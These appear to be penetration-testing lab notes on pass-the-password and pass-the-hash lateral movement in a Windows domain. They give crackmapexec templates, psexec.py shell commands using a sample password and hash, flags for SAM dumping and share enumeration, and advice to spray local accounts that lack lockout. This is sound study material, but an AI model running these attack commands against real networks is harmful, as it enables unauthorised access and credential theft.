# Pass the Hash/Password Overview

## What is it?

* using cracked passwords and SAM hashes for lateral movement in the network
* super powerful

## Crackmapexec Pass the Password

### Crackmapexec Command

```bash
crackmapexec <protocol: smb is best> <ip/CIDR> -u <user> -d <domain> -p <pass>
```

### Password Spraying?

* Domain Accounts have a lockout policy, but local accounts do not
* hammer local accounts!

### Popping a Shell with the Credentials Received

```bash
psexec.py marvel/fcastle:'P@$$w0rd!'@172.16.35.6
```

### Flag to Attempt a SAM Dump at Success

```bash
--sam
```

### Enumerate Shares

```bash
--shares
```

### Read the Documentation!

```bash
crackmapexec --help
```

## Crackmapexec Pass the Hash \(cannot pass NTLMv2\)

### Crackmapexec Command

```bash
crackmapexec <protcol: smb is best> <ip/CIDR> -u <user> -H <last hash part>
```

### Popping a Shell with the Credentials Received

```bash
psexec.py “frank castle”:@172.16.35.7 -hashes <LM+NT aka the whole hash>
```

